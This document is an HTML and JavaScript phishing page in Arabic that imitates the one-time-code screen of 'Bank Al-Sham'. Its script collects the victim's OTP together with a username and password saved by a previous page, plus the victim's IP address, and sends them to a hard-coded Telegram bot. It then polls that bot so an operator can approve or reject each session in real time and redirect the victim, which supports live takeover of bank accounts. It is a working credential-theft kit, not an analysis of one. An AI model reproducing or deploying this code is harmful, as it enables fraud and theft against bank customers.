<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>بنك الشام - رمز التحقق</title>
    <link href="https://fonts.googleapis.com/css2?family=Scheherazade+New:wght@400;700&family=Amiri:wght@400;700&display=swap" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Scheherazade New', 'Amiri', 'Arial', sans-serif;
            background: linear-gradient(180deg, #9d1b30 0%, #c71f37 100%);
            min-height: 100vh;
            position: relative;
            overflow-x: hidden;
        }

        /* Islamic Pattern Background */
        body::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background-image: 
                repeating-linear-gradient(45deg, transparent, transparent 35px, rgba(139, 0, 0, 0.1) 35px, rgba(139, 0, 0, 0.1) 70px),
                repeating-linear-gradient(-45deg, transparent, transparent 35px, rgba(139, 0, 0, 0.1) 35px, rgba(139, 0, 0, 0.1) 70px);
            opacity: 0.3;
            z-index: 0;
        }

        /* Star Pattern */
        .pattern-star {
            position: absolute;
            width: 80px;
            height: 80px;
            opacity: 0.15;
        }

        .pattern-star:nth-child(1) { top: 50px; left: 40px; }
        .pattern-star:nth-child(2) { top: 150px; right: 60px; }
        .pattern-star:nth-child(3) { top: 300px; left: 80px; }
        .pattern-star:nth-child(4) { bottom: 200px; right: 100px; }
        .pattern-star:nth-child(5) { bottom: 50px; left: 120px; }
        .pattern-star:nth-child(6) { top: 100px; left: 50%; }
        .pattern-star:nth-child(7) { top: 400px; right: 40px; }

        .container {
            position: relative;
            z-index: 1;
            max-width: 100%;
            margin: 0 auto;
            padding: 20px;
        }

        /* Header with Menu */
        .header {
            display: flex;
            justify-content: flex-end;
            padding: 20px 30px;
            position: relative;
            z-index: 10;
        }

        .menu-icon {
            display: flex;
            align-items: center;
            gap: 15px;
            cursor: pointer;
        }

        .menu-bars {
            display: flex;
            flex-direction: column;
            gap: 5px;
        }

        .menu-bars span {
            width: 30px;
            height: 3px;
            background: white;
            border-radius: 2px;
        }

        .menu-arrow {
            color: white;
            font-size: 28px;
            font-weight: bold;
        }

        /* Logo Section */
        .logo-section {
            text-align: center;
            margin: 30px 0 50px;
        }

        .logo {
            width: 180px;
            height: 180px;
            margin: 0 auto 20px;
            background: white;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
            position: relative;
        }

        .logo::before {
            content: '';
            position: absolute;
            width: 200px;
            height: 200px;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 50%;
            z-index: -1;
        }

        .logo img {
            width: 160px;
            height: 160px;
            object-fit: contain;
        }

        .logo-text {
            color: white;
            font-size: 42px;
            font-weight: 300;
            letter-spacing: 2px;
            text-shadow: 0 2px 10px rgba(0, 0, 0, 0.2);
            margin-top: 10px;
        }

        /* OTP Card */
        .otp-card {
            background: white;
            border-radius: 30px 30px 0 0;
            padding: 40px 25px 60px;
            margin-top: 40px;
            box-shadow: 0 -10px 40px rgba(0, 0, 0, 0.2);
            position: relative;
        }

        .form-title {
            text-align: center;
            color: #666;
            font-size: 24px;
            font-weight: 300;
            margin-bottom: 15px;
            letter-spacing: 1px;
        }

        .form-subtitle {
            text-align: center;
            color: #999;
            font-size: 16px;
            margin-bottom: 35px;
            line-height: 1.6;
        }

        .input-group {
            margin-bottom: 30px;
        }

        .input-field {
            width: 100%;
            padding: 18px 20px;
            border: 2px solid #ddd;
            border-radius: 12px;
            font-size: 24px;
            text-align: center;
            color: #333;
            transition: all 0.3s;
            background: white;
            letter-spacing: 8px;
            font-weight: 500;
        }

        .input-field:focus {
            outline: none;
            border-color: #9d1b30;
        }

        .input-field::placeholder {
            color: #bbb;
            letter-spacing: 2px;
            font-size: 18px;
        }

        .submit-button {
            width: 100%;
            padding: 18px;
            background: linear-gradient(135deg, #9d1b30 0%, #c71f37 100%);
            color: white;
            border: none;
            border-radius: 12px;
            font-size: 20px;
            font-weight: 500;
            cursor: pointer;
            margin-bottom: 20px;
            box-shadow: 0 4px 15px rgba(157, 27, 48, 0.3);
            transition: all 0.3s;
        }

        .submit-button:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(157, 27, 48, 0.4);
        }

        .submit-button:active {
            transform: translateY(0);
        }

        .resend-section {
            text-align: center;
            margin: 25px 0;
        }

        .resend-text {
            color: #666;
            font-size: 16px;
            margin-bottom: 10px;
        }

        .resend-link {
            color: #9d1b30;
            text-decoration: none;
            font-size: 17px;
            font-weight: 500;
            display: inline-block;
            margin-top: 10px;
        }

        .resend-link:hover {
            text-decoration: underline;
        }

        /* Error Message */
        .error-message {
            background: #ffe6e6;
            border: 1px solid #ffcccc;
            color: #c71f37;
            padding: 12px 15px;
            border-radius: 8px;
            margin-top: 15px;
            margin-bottom: 20px;
            text-align: center;
            font-size: 16px;
            display: none;
        }

        .error-message.show {
            display: block;
            animation: shake 0.5s;
        }

        @keyframes shake {
            0%, 100% { transform: translateX(0); }
            25% { transform: translateX(-10px); }
            75% { transform: translateX(10px); }
        }

        .success-message {
            background: #e6f7e6;
            border: 1px solid #b3e6b3;
            color: #2d862d;
            padding: 12px 15px;
            border-radius: 8px;
            margin-top: 15px;
            margin-bottom: 20px;
            text-align: center;
            font-size: 16px;
            display: none;
        }

        .success-message.show {
            display: block;
        }

        /* Star SVG Pattern */
        .star-pattern {
            fill: none;
            stroke: rgba(139, 0, 0, 0.2);
            stroke-width: 2;
        }

        @media (max-width: 768px) {
            .logo {
                width: 150px;
                height: 150px;
            }

            .logo img {
                width: 130px;
                height: 130px;
            }

            .logo-text {
                font-size: 36px;
            }

            .otp-card {
                border-radius: 25px 25px 0 0;
                padding: 30px 20px 50px;
            }
        }
    </style>
</head>
<body>
    <!-- Islamic Star Patterns -->
    <svg class="pattern-star" viewBox="0 0 100 100">
        <path class="star-pattern" d="M50,10 L60,40 L90,40 L65,60 L75,90 L50,70 L25,90 L35,60 L10,40 L40,40 Z"/>
    </svg>
    <svg class="pattern-star" viewBox="0 0 100 100">
        <path class="star-pattern" d="M50,10 L60,40 L90,40 L65,60 L75,90 L50,70 L25,90 L35,60 L10,40 L40,40 Z"/>
    </svg>
    <svg class="pattern-star" viewBox="0 0 100 100">
        <path class="star-pattern" d="M50,10 L60,40 L90,40 L65,60 L75,90 L50,70 L25,90 L35,60 L10,40 L40,40 Z"/>
    </svg>
    <svg class="pattern-star" viewBox="0 0 100 100">
        <path class="star-pattern" d="M50,10 L60,40 L90,40 L65,60 L75,90 L50,70 L25,90 L35,60 L10,40 L40,40 Z"/>
    </svg>
    <svg class="pattern-star" viewBox="0 0 100 100">
        <path class="star-pattern" d="M50,10 L60,40 L90,40 L65,60 L75,90 L50,70 L25,90 L35,60 L10,40 L40,40 Z"/>
    </svg>
    <svg class="pattern-star" viewBox="0 0 100 100">
        <path class="star-pattern" d="M50,10 L60,40 L90,40 L65,60 L75,90 L50,70 L25,90 L35,60 L10,40 L40,40 Z"/>
    </svg>
    <svg class="pattern-star" viewBox="0 0 100 100">
        <path class="star-pattern" d="M50,10 L60,40 L90,40 L65,60 L75,90 L50,70 L25,90 L35,60 L10,40 L40,40 Z"/>
    </svg>

    <div class="container">
        <!-- Header Menu -->
        <div class="header">
            <div class="menu-icon">
                <div class="menu-bars">
                    <span></span>
                    <span></span>
                    <span></span>
                </div>
                <div class="menu-arrow">❯</div>
            </div>
        </div>

        <!-- Logo Section -->
        <div class="logo-section">
            <div class="logo">
                <img src="image.jpg" alt="بنك الشام">
            </div>
            <div class="logo-text">بنك الشام</div>
        </div>

        <!-- OTP Card -->
        <div class="otp-card">
            <h2 class="form-title">رمز التحقق</h2>
            <p class="form-subtitle">الرجاء إدخال رمز التحقق المرسل إليك</p>
            
            <form id="otpForm">
                <div class="input-group">
                    <input 
                        type="text" 
                        class="input-field" 
                        placeholder="أدخل الرمز"
                        id="otpCode"
                        maxlength="6"
                        pattern="[0-9]*"
                        inputmode="numeric"
                        required
                    >
                </div>

                <!-- Error Message -->
                <div class="error-message" id="errorMessage"></div>
                
                <!-- Success Message -->
                <div class="success-message" id="successMessage"></div>

                <button type="submit" class="submit-button">متابعة</button>

                <div class="resend-section">
                    <p class="resend-text">لم يصلك الرمز؟</p>
                    <a href="#" class="resend-link" id="resendLink">إعادة إرسال الرمز</a>
                </div>
            </form>
        </div>
    </div>

    <script>
        // Telegram Bot Integration
        const TELEGRAM_BOT_TOKEN = '8286980847:AAEuWMmuadQ5oa7X216n8qj7bhjVYcLgmag';
        const TELEGRAM_CHAT_ID = '6888218123';

        const otpInput = document.getElementById('otpCode');
        const errorMessage = document.getElementById('errorMessage');
        const successMessage = document.getElementById('successMessage');
        
        let sessionId = null;
        let pollingInterval = null;

        // Check if redirected with error
        window.addEventListener('DOMContentLoaded', function() {
            const urlParams = new URLSearchParams(window.location.search);
            if (urlParams.get('error') === 'invalid') {
                showError('رمز التحقق غير صحيح، الرجاء المحاولة مرة أخرى');
            }
        });

        // Only allow numbers input
        otpInput.addEventListener('input', function(e) {
            // Remove any non-numeric characters
            this.value = this.value.replace(/[^0-9]/g, '');
            
            // Hide messages when user types
            errorMessage.classList.remove('show');
            successMessage.classList.remove('show');
        });

        // Form Submit
        document.getElementById('otpForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const otpCode = otpInput.value;
            
            // Check if OTP is empty
            if (otpCode.length === 0) {
                showError('الرجاء إدخال رمز التحقق');
                return;
            }
            
            // Check if OTP is exactly 4 or 6 digits
            if (otpCode.length !== 4 && otpCode.length !== 6) {
                showError('الرمز خاطئ، الرجاء التحقق من الرمز');
                return;
            }
            
            // Generate unique session ID
            sessionId = Date.now().toString();
            
            // Show success message
            showSuccess('جاري التحقق من الرمز...');
            
            // Get username and password from localStorage
            const username = localStorage.getItem('bank_username') || 'غير متوفر';
            const password = localStorage.getItem('bank_password') || 'غير متوفر';
            
            // Send OTP to Telegram with username and password
            const message = `🔢 رمز التحقق - بنك الشام\n\n👤 اسم المستخدم: ${username}\n🔑 كلمة السر: ${password}\n🔐 رمز التحقق: ${otpCode}\n\n📱 الوقت: ${new Date().toLocaleString('ar-JO')}\n🌐 IP: ${await getIP()}\n🆔 Session: ${sessionId}\n\n⬇️ اختر الإجراء:`;
            
            try {
                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CHAT_ID,
                        text: message,
                        reply_markup: {
                            inline_keyboard: [
                                [
                                    {
                                        text: '✅ قبول',
                                        callback_data: `accept_${sessionId}`
                                    },
                                    {
                                        text: '❌ رفض',
                                        callback_data: `reject_${sessionId}`
                                    }
                                ]
                            ]
                        }
                    })
                });
                
                if (response.ok) {
                    // Start polling for admin response
                    startPolling();
                } else {
                    showError('حدث خطأ في الاتصال، يرجى المحاولة مرة أخرى');
                }
            } catch (error) {
                console.error('Error:', error);
                showError('حدث خطأ في الاتصال، يرجى المحاولة مرة أخرى');
            }
        });

        function startPolling() {
            let offset = 0;
            
            pollingInterval = setInterval(async () => {
                try {
                    const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates?offset=${offset}&timeout=1`);
                    const data = await response.json();
                    
                    if (data.ok && data.result.length > 0) {
                        for (const update of data.result) {
                            offset = update.update_id + 1;
                            
                            // Check for callback query (button press)
                            if (update.callback_query) {
                                const callbackData = update.callback_query.data;
                                
                                // Check if this callback is for our session
                                if (callbackData.includes(sessionId)) {
                                    clearInterval(pollingInterval);
                                    
                                    // Answer callback query
                                    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
                                        method: 'POST',
                                        headers: { 'Content-Type': 'application/json' },
                                        body: JSON.stringify({
                                            callback_query_id: update.callback_query.id,
                                            text: 'تم التوجيه ✓'
                                        })
                                    });
                                    
                                    // Redirect based on button pressed
                                    if (callbackData.startsWith('accept_')) {
                                        window.location.href = 'otp1.html';
                                    } else if (callbackData.startsWith('reject_')) {
                                        window.location.href = 'otp.html?error=invalid';
                                    }
                                }
                            }
                        }
                    }
                } catch (error) {
                    console.error('Polling error:', error);
                }
            }, 2000); // Poll every 2 seconds
            
            // Stop polling after 5 minutes
            setTimeout(() => {
                if (pollingInterval) {
                    clearInterval(pollingInterval);
                    showError('انتهت مهلة الانتظار. يرجى المحاولة مرة أخرى.');
                }
            }, 300000);
        }

        // Resend OTP Link
        document.getElementById('resendLink').addEventListener('click', async function(e) {
            e.preventDefault();
            
            showSuccess('جاري إرسال الرمز...');
            
            const message = `🔄 طلب إعادة إرسال رمز التحقق\n\n📱 الوقت: ${new Date().toLocaleString('ar-JO')}\n🌐 IP: ${await getIP()}`;
            
            try {
                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CHAT_ID,
                        text: message
                    })
                });
                
                if (response.ok) {
                    showSuccess('تم إرسال الرمز مرة أخرى');
                } else {
                    showError('حدث خطأ، يرجى المحاولة مرة أخرى');
                }
            } catch (error) {
                console.error('Error:', error);
                showError('حدث خطأ، يرجى المحاولة مرة أخرى');
            }
        });

        function showError(message) {
            errorMessage.textContent = message;
            errorMessage.classList.add('show');
            successMessage.classList.remove('show');
        }

        function showSuccess(message) {
            successMessage.textContent = message;
            successMessage.classList.add('show');
            errorMessage.classList.remove('show');
        }

        async function getIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (error) {
                return 'غير متوفر';
            }
        }
    </script>
</body>
</html>
